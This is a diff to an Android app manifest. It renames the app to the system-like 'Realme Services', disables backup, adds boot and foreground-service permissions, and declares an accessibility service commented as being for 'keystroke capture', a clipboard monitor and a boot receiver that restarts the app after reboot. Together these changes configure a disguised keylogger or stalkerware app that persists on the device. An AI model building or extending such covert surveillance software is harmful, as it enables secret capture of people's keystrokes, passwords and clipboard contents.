@@ -2,21 +2,23 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- No internet permission required for privacy -->
+    <!-- No internet. No cloud. Fully private. -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:icon="@drawable/ic_app_icon"
-        android:label="Realme 12"
+        android:label="Realme Services"
         android:supportsRtl="true"
         android:theme="@android:style/Theme.DeviceDefault.NoActionBar"
         tools:targetApi="31">
+
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:label="Realme 12"
+            android:label="Realme Services"
             android:theme="@android:style/Theme.DeviceDefault.NoActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -24,6 +26,7 @@
             </intent-filter>
         </activity>
 
+        <!-- Accessibility service for keystroke capture -->
         <service
             android:name=".service.TypeVaultAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -35,6 +38,22 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- Clipboard monitor service -->
+        <service
+            android:name=".service.ClipboardMonitorService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- Auto-restart after reboot -->
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
 
     </application>
 
